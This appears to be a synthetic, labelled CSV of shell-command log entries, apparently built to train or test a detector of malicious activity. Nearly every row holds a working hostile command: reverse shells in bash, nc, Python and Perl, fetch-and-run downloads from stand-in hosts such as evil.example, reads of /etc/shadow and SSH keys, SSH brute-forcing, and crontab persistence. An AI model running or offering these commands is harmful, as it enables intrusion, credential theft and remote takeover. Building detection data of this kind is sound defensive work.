id,timestamp,log,label
log-410,2025-10-27T22:00:32.542573Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""172.16.0.9"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-411,2025-02-09T08:56:25.542584Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""172.16.0.9"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-412,2024-12-14T00:59:31.542593Z,echo '@reboot root /tmp/runme31.sh' >> /etc/crontab,persistence_or_filesystem
log-413,2025-10-26T00:07:23.542602Z,"python3 -c 'import urllib.request as u;open(""/tmp/p99.py"",""wb"").write(u.urlopen(""http://evil.example/p99.py"").read())'; python3 /tmp/p99.py",malware_download
log-414,2025-01-20T23:18:16.542612Z,bash -i >& /dev/tcp/172.16.0.9/2222 0>&1,reverse_shell
log-415,2025-04-23T22:59:16.542621Z,curl -fsSL http://evil.example/install60.php -o /tmp/install60.php; php /tmp/install60.php,malware_download
log-416,2025-04-04T08:15:30.542630Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-417,2025-03-14T22:56:40.542639Z,nc -e /bin/sh 10.0.0.5 9001,reverse_shell
log-418,2025-02-04T19:29:20.542648Z,"perl -e 'use Socket;$i=""1.2.3.4"";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-419,2025-08-16T18:19:56.542658Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-420,2025-09-02T01:24:52.542668Z,curl -fsSL http://malware.srv/runme96.php -o /tmp/runme96.php; php /tmp/runme96.php,malware_download
log-421,2025-09-21T02:06:00.542677Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
log-422,2025-10-21T22:25:15.542686Z,mkdir /tmp/tmpdir30; chmod 777 /tmp/tmpdir30,persistence_or_filesystem
log-423,2025-10-26T22:35:17.542695Z,curl -fsSL http://badhost.local/install90.php -o /tmp/install90.php; php /tmp/install90.php,malware_download
log-424,2024-12-06T18:50:34.542705Z,"python3 -c 'import urllib.request as u;open(""/tmp/update49.py"",""wb"").write(u.urlopen(""http://evil.example/update49.py"").read())'; python3 /tmp/update49.py",malware_download
log-425,2024-12-31T20:19:04.542714Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-426,2025-06-06T02:00:38.542724Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
log-427,2025-10-06T13:29:46.542733Z,find / -name '*.conf' -type f,enumeration
log-428,2025-09-17T09:42:20.542741Z,cat /etc/passwd,credential_harvest
log-429,2025-01-10T15:15:42.542751Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
log-430,2025-04-02T11:58:41.542760Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-431,2025-02-03T07:43:03.542769Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-432,2025-09-04T03:13:32.542778Z,curl -fsSL http://payloads.net/install1.php -o /tmp/install1.php; php /tmp/install1.php,malware_download
log-433,2025-02-27T22:17:43.542787Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-434,2025-10-01T21:24:11.542796Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-435,2025-03-31T08:45:45.542804Z,find / -name '*.conf' -type f,enumeration
log-436,2025-04-11T04:38:41.542813Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-437,2025-08-18T08:59:36.542823Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme10.py"",""wb"").write(u.urlopen(""http://badhost.local/runme10.py"").read())'; python3 /tmp/runme10.py",malware_download
log-438,2025-02-24T12:47:26.542832Z,curl -fsSL http://malware.srv/payload81.php -o /tmp/payload81.php; php /tmp/payload81.php,malware_download
log-439,2025-05-15T09:31:54.542841Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-440,2025-01-16T12:13:47.542850Z,bash -i >& /dev/tcp/203.0.113.7/2222 0>&1,reverse_shell
log-441,2025-04-19T11:36:51.542859Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-442,2025-08-19T16:26:30.542868Z,mkdir /tmp/xdata29; chmod 777 /tmp/xdata29,persistence_or_filesystem
log-443,2025-06-02T06:42:41.542878Z,curl http://malware.srv/payload -o /tmp/p ; bash /tmp/p,malware_download
log-444,2025-09-09T10:07:46.542888Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-445,2025-11-08T15:43:56.542897Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-446,2025-07-03T08:48:54.542907Z,"perl -e 'use Socket;$i=""1.2.3.4"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-447,2025-02-05T06:57:46.542917Z,curl -fsSL http://badhost.local/p87.php -o /tmp/p87.php; php /tmp/p87.php,malware_download
log-448,2025-02-18T02:06:42.542926Z,sshpass -p 'password' ssh ec2-user@10.0.0.5,brute_force
log-449,2025-05-18T04:09:34.542935Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 6666 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-450,2024-12-21T06:56:06.542944Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-451,2025-07-03T21:44:41.542954Z,"python3 -c 'import urllib.request as u;open(""/tmp/update77.py"",""wb"").write(u.urlopen(""http://payloads.net/update77.py"").read())'; python3 /tmp/update77.py",malware_download
log-452,2025-10-24T23:48:57.542962Z,some-weird-tool --foo bar,unknown
log-453,2025-04-20T10:45:06.542971Z,cat /etc/passwd,credential_harvest
log-454,2024-12-15T03:14:15.542980Z,curl -fsSL http://malware.srv/payload94.php -o /tmp/payload94.php; php /tmp/payload94.php,malware_download
log-455,2025-04-12T04:04:05.542990Z,nc -e /bin/sh 45.23.11.9 4444,reverse_shell
log-456,2025-05-26T09:23:30.542999Z,mkdir /tmp/backdoor30; chmod 777 /tmp/backdoor30,persistence_or_filesystem
log-457,2024-12-08T03:07:29.543008Z,echo 'hello world',unknown
log-458,2025-08-08T09:39:25.543018Z,curl http://badhost.local/payload -o /tmp/p && bash /tmp/p,malware_download
log-459,2025-01-04T22:54:34.543028Z,nc -e /bin/sh 192.0.2.12 443,reverse_shell
log-460,2025-06-30T05:51:59.543038Z,"python3 -c 'import urllib.request as u;open(""/tmp/x74.py"",""wb"").write(u.urlopen(""http://malware.srv/x74.py"").read())'; python3 /tmp/x74.py",malware_download
log-461,2025-09-23T04:00:52.543047Z,bash -i >& /dev/tcp/172.16.0.9/8080 0>&1,reverse_shell
log-462,2025-06-26T12:49:56.543057Z,mkdir /tmp/tmpdir98; chmod 777 /tmp/tmpdir98,persistence_or_filesystem
log-463,2025-11-23T05:37:32.543066Z,echo '@reboot root /tmp/x14.sh' >> /etc/crontab,persistence_or_filesystem
log-464,2024-12-19T10:33:16.543075Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-465,2025-08-14T02:44:01.543085Z,"python3 -c 'import urllib.request as u;open(""/tmp/install18.py"",""wb"").write(u.urlopen(""http://badhost.local/install18.py"").read())'; python3 /tmp/install18.py",malware_download
log-466,2025-03-31T16:04:41.543094Z,sshpass -p 'password' ssh admin@192.0.2.12,brute_force
log-467,2025-02-17T06:17:14.543103Z,find / -name '*.conf' -type f,enumeration
log-468,2025-11-16T07:36:07.543113Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
log-469,2025-07-09T05:35:01.543122Z,nc -e /bin/sh 10.0.0.5 2222,reverse_shell
log-470,2025-02-10T08:00:47.543130Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-471,2025-10-21T18:48:07.543140Z,"python3 -c 'import urllib.request as u;open(""/tmp/payload92.py"",""wb"").write(u.urlopen(""http://badhost.local/payload92.py"").read())'; python3 /tmp/payload92.py",malware_download
log-472,2025-03-20T05:37:20.543150Z,bash -i >& /dev/tcp/1.2.3.4/4444 0>&1,reverse_shell
log-473,2025-09-23T21:23:41.543159Z,echo '@reboot root /tmp/payload85.sh' >> /etc/crontab,persistence_or_filesystem
log-474,2025-08-26T03:46:42.543169Z,cat /etc/passwd,credential_harvest
log-475,2025-02-08T10:35:13.543178Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-476,2025-09-03T22:30:33.543187Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 6666 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-477,2025-09-06T22:01:59.543197Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
log-478,2025-10-20T17:00:36.543206Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-479,2025-07-19T15:55:15.543215Z,"perl -e 'use Socket;$i=""192.0.2.12"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-480,2024-12-19T05:53:16.543224Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
log-481,2025-01-26T07:25:20.543233Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-482,2025-10-08T03:02:02.543242Z,hydra -l root -P /tmp/wordlist.txt ssh://192.0.2.12,brute_force
log-483,2025-01-13T20:34:55.543252Z,sshpass -p 'toor' ssh ec2-user@203.0.113.7,brute_force
log-484,2025-05-18T07:11:36.543261Z,cat /etc/shadow,credential_harvest
log-485,2025-09-18T05:04:17.543269Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-486,2025-03-08T03:13:32.543278Z,hydra -l root -P /tmp/wordlist.txt ssh://192.0.2.12,brute_force
log-487,2025-09-02T06:14:13.543288Z,curl http://badhost.local/payload -o /tmp/p && bash /tmp/p,malware_download
log-488,2025-07-05T20:02:16.543297Z,curl http://badhost.local/payload -o /tmp/p && bash /tmp/p,malware_download
log-489,2025-03-25T22:17:50.543306Z,sshpass -p 'password' ssh root@10.0.0.5,brute_force
log-490,2025-11-18T11:10:55.543316Z,"python3 -c 'import urllib.request as u;open(""/tmp/p67.py"",""wb"").write(u.urlopen(""http://malware.srv/p67.py"").read())'; python3 /tmp/p67.py",malware_download
log-491,2025-01-03T16:31:48.543325Z,nc -e /bin/sh 10.0.0.5 4444,reverse_shell
log-492,2025-10-07T17:58:48.543334Z,curl http://malicious.test/payload -o /tmp/p && bash /tmp/p,malware_download
log-493,2024-12-11T17:35:37.543343Z,curl http://evil.example/payload -o /tmp/p ; bash /tmp/p,malware_download
log-494,2024-12-27T02:04:12.543352Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-495,2024-12-06T08:29:01.543362Z,wget http://evil.example/payload46.sh && chmod +x payload46.sh && ./ payload46.sh,malware_download
log-496,2025-08-10T19:45:32.543372Z,"python3 -c 'import urllib.request as u;open(""/tmp/install40.py"",""wb"").write(u.urlopen(""http://malware.srv/install40.py"").read())'; python3 /tmp/install40.py",malware_download
log-497,2025-06-10T10:28:48.543381Z,curl http://badhost.local/payload -o /tmp/p && bash /tmp/p,malware_download
log-498,2025-02-25T04:15:41.543390Z,sshpass -p 'toor' ssh admin@10.0.0.5,brute_force
log-499,2025-06-15T20:19:31.543399Z,curl http://malware.srv/payload -o /tmp/p && bash /tmp/p,malware_download
log-500,2024-12-07T07:00:05.543408Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-501,2025-11-01T06:07:30.543416Z,find / -name '*.conf' -type f,enumeration
log-502,2025-09-22T22:28:27.543426Z,"python3 -c 'import urllib.request as u;open(""/tmp/x18.py"",""wb"").write(u.urlopen(""http://badhost.local/x18.py"").read())'; python3 /tmp/x18.py",malware_download
log-503,2025-02-18T16:49:08.543435Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 6666 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-504,2025-03-01T01:58:22.543445Z,echo '@reboot root /tmp/x38.sh' >> /etc/crontab,persistence_or_filesystem
log-505,2025-05-25T13:07:26.543455Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
log-506,2024-12-28T23:20:10.543464Z,bash -i >& /dev/tcp/192.0.2.12/8080 0>&1,reverse_shell
log-507,2025-04-17T05:54:02.543474Z,wget http://evil.example/x11.sh && chmod +x x11.sh && ./ x11.sh,malware_download
log-508,2025-05-03T05:53:43.543483Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-509,2025-11-17T07:13:17.543492Z,"python3 -c 'import urllib.request as u;open(""/tmp/payload74.py"",""wb"").write(u.urlopen(""http://malicious.test/payload74.py"").read())'; python3 /tmp/payload74.py",malware_download
log-510,2025-03-18T01:03:31.543502Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 2222 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-511,2025-12-01T10:50:10.543512Z,hydra -l root -P /tmp/wordlist.txt ssh://45.23.11.9,brute_force
log-512,2024-12-16T06:08:52.543521Z,for i in {1..1000}; do ssh root@172.16.0.9 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-513,2025-01-22T02:54:47.543530Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-514,2025-07-29T03:23:24.543539Z,nc -e /bin/sh 203.0.113.7 4444,reverse_shell
log-515,2025-08-08T10:15:06.543548Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-516,2025-01-14T21:48:59.543558Z,wget http://badhost.local/install99.sh && chmod +x install99.sh && ./ install99.sh,malware_download
log-517,2025-03-09T19:23:59.543567Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
log-518,2025-06-28T08:36:04.543577Z,"perl -e 'use Socket;$i=""10.0.0.5"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-519,2025-07-21T18:10:58.543586Z,cat /etc/passwd,credential_harvest
log-520,2025-03-02T03:31:19.543595Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-521,2025-08-31T02:40:04.543604Z,cat /etc/passwd,credential_harvest
log-522,2025-01-04T04:19:03.543614Z,wget http://evil.example/runme16.sh ; chmod +x runme16.sh ; ./ runme16.sh,malware_download
log-523,2025-04-18T17:50:39.543623Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-524,2025-11-06T18:30:18.543632Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-525,2025-03-30T23:57:33.543641Z,echo '@reboot root /tmp/payload51.sh' >> /etc/crontab,persistence_or_filesystem
log-526,2025-10-31T01:20:36.543651Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme34.py"",""wb"").write(u.urlopen(""http://malicious.test/runme34.py"").read())'; python3 /tmp/runme34.py",malware_download
log-527,2025-09-20T15:53:54.543660Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-528,2025-08-14T03:47:12.543669Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-529,2025-01-17T04:20:52.543678Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-530,2025-07-06T13:42:14.543688Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
log-531,2025-02-06T19:13:27.543696Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-532,2025-06-18T02:20:54.543706Z,sshpass -p '123456' ssh ec2-user@172.16.0.9,brute_force
log-533,2025-01-07T03:12:47.543716Z,sshpass -p 'password' ssh admin@192.0.2.12,brute_force
log-534,2025-10-18T11:17:52.543724Z,hydra -l root -P /tmp/wordlist.txt ssh://45.23.11.9,brute_force
log-535,2024-12-24T13:16:13.543733Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-536,2025-09-25T12:47:30.543743Z,bash -i >& /dev/tcp/45.23.11.9/443 0>&1,reverse_shell
log-537,2025-04-02T00:58:05.543753Z,curl http://malware.srv/payload -o /tmp/p ; bash /tmp/p,malware_download
log-538,2025-10-03T20:24:04.543762Z,curl -fsSL http://evil.example/runme99.php -o /tmp/runme99.php; php /tmp/runme99.php,malware_download
log-539,2025-03-26T05:37:23.543772Z,curl http://malware.srv/payload -o /tmp/p ; bash /tmp/p,malware_download
log-540,2025-06-04T08:15:23.543781Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-541,2025-09-07T22:05:25.543790Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 4444 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-542,2025-04-19T02:19:48.543798Z,cat /etc/passwd,credential_harvest
log-543,2025-02-06T06:47:55.543808Z,wget http://malware.srv/payload15.sh && chmod +x payload15.sh && ./ payload15.sh,malware_download
log-544,2025-05-09T20:37:37.543817Z,bash -i >& /dev/tcp/45.23.11.9/443 0>&1,reverse_shell
log-545,2025-04-18T21:25:27.543826Z,bash -i >& /dev/tcp/192.0.2.12/6666 0>&1,reverse_shell
log-546,2024-12-17T07:12:09.543835Z,bash -i >& /dev/tcp/172.16.0.9/8080 0>&1,reverse_shell
log-547,2025-09-17T04:40:42.543844Z,curl -fsSL http://evil.example/update29.php -o /tmp/update29.php; php /tmp/update29.php,malware_download
log-548,2025-02-07T10:40:04.543853Z,mkdir /tmp/backdoor28; chmod 777 /tmp/backdoor28,persistence_or_filesystem
log-549,2025-09-21T07:01:09.543862Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-550,2025-10-17T11:26:03.543871Z,echo '@reboot root /tmp/payload51.sh' >> /etc/crontab,persistence_or_filesystem
log-551,2025-01-10T00:36:13.543880Z,sshpass -p 'password' ssh ec2-user@1.2.3.4,brute_force
log-552,2025-05-31T05:05:08.543889Z,curl http://malicious.test/payload -o /tmp/p && bash /tmp/p,malware_download
log-553,2025-07-21T05:36:24.543899Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
log-554,2025-04-12T05:21:54.543909Z,sshpass -p 'admin123' ssh root@203.0.113.7,brute_force
log-555,2025-04-06T06:47:08.543918Z,curl http://malicious.test/payload -o /tmp/p ; bash /tmp/p,malware_download
log-556,2025-11-10T01:36:00.543927Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-557,2025-01-23T14:30:12.543937Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-558,2025-10-12T21:54:29.543946Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-559,2025-06-12T12:36:38.543955Z,bash -i >& /dev/tcp/45.23.11.9/443 0>&1,reverse_shell
log-560,2025-02-13T15:25:35.543964Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
log-561,2025-09-10T18:26:26.543973Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-562,2025-03-07T17:31:18.543982Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-563,2025-07-26T14:26:52.543992Z,curl -fsSL http://malicious.test/update74.php -o /tmp/update74.php; php /tmp/update74.php,malware_download
log-564,2025-05-13T09:43:26.544002Z,wget http://badhost.local/payload21.sh && chmod +x payload21.sh && ./ payload21.sh,malware_download
log-565,2025-04-24T15:34:33.544011Z,cat /etc/shadow,credential_harvest
log-566,2025-06-08T00:32:24.544020Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-567,2024-12-29T00:43:33.544029Z,bash -i >& /dev/tcp/203.0.113.7/8080 0>&1,reverse_shell
log-568,2025-05-23T14:19:58.544038Z,date; whoami,unknown
log-569,2025-05-03T12:49:36.544048Z,curl http://badhost.local/payload -o /tmp/p && bash /tmp/p,malware_download
log-570,2025-01-13T17:57:20.544059Z,wget http://malicious.test/p76.sh ; chmod +x p76.sh ; ./ p76.sh,malware_download
log-571,2025-03-31T02:22:10.544068Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
log-572,2025-07-06T04:35:07.544076Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-573,2025-10-06T17:48:50.544085Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-574,2025-10-06T14:19:09.544094Z,sshpass -p '123456' ssh ec2-user@172.16.0.9,brute_force
log-575,2025-09-15T01:58:53.544104Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
log-576,2025-10-19T06:06:25.544113Z,"perl -e 'use Socket;$i=""1.2.3.4"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-577,2025-03-08T06:47:18.544122Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-578,2025-10-15T19:58:28.544131Z,bash -i >& /dev/tcp/45.23.11.9/6666 0>&1,reverse_shell
log-579,2025-11-28T10:26:54.544141Z,curl -fsSL http://malicious.test/install10.php -o /tmp/install10.php; php /tmp/install10.php,malware_download
log-580,2025-10-07T19:48:41.544150Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.0.2.12"",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-581,2025-11-27T10:16:33.544160Z,curl -fsSL http://malicious.test/p55.php -o /tmp/p55.php; php /tmp/p55.php,malware_download
log-582,2025-07-06T03:31:59.544172Z,cat /etc/passwd,credential_harvest
log-583,2025-09-23T17:48:29.544183Z,cat /etc/passwd,credential_harvest
log-584,2025-08-17T20:55:59.544192Z,echo '@reboot root /tmp/p75.sh' >> /etc/crontab,persistence_or_filesystem
log-585,2024-12-14T06:26:54.544201Z,mkdir /tmp/backdoor47; chmod 777 /tmp/backdoor47,persistence_or_filesystem
log-586,2025-06-29T23:24:23.544211Z,wget http://malicious.test/payload30.sh && chmod +x payload30.sh && ./ payload30.sh,malware_download
log-587,2025-06-22T09:55:54.544220Z,hydra -l root -P /tmp/wordlist.txt ssh://192.0.2.12,brute_force
log-588,2025-05-01T21:02:01.544229Z,curl http://payloads.net/payload -o /tmp/p && bash /tmp/p,malware_download
log-589,2025-09-24T13:31:57.544238Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-590,2025-05-14T23:26:15.544247Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
log-591,2025-03-20T17:45:11.544261Z,"perl -e 'use Socket;$i=""10.0.0.5"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-592,2025-10-18T01:58:58.544271Z,"python3 -c 'import urllib.request as u;open(""/tmp/x81.py"",""wb"").write(u.urlopen(""http://evil.example/x81.py"").read())'; python3 /tmp/x81.py",malware_download
log-593,2025-10-28T08:58:35.544280Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-594,2025-03-03T03:15:49.544290Z,cat /etc/shadow,credential_harvest
log-595,2025-11-20T21:28:03.544300Z,mkdir /tmp/backdoor5; chmod 777 /tmp/backdoor5,persistence_or_filesystem
log-596,2025-10-11T07:11:45.544308Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-597,2025-07-25T09:53:45.544317Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-598,2025-06-02T15:12:18.544326Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-599,2025-06-11T01:51:07.544335Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-600,2025-11-26T08:18:14.544344Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-601,2025-11-25T16:22:59.544353Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-602,2025-03-27T09:36:07.544363Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-603,2025-10-29T08:23:53.544372Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-604,2025-10-19T06:21:29.544381Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
log-605,2025-07-06T12:08:43.544390Z,nc -e /bin/sh 203.0.113.7 2222,reverse_shell
log-606,2025-01-19T09:06:43.544398Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-607,2025-01-21T01:43:37.544407Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-608,2025-01-16T20:29:45.544417Z,for i in {1..1000}; do ssh root@45.23.11.9 -p 8080 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
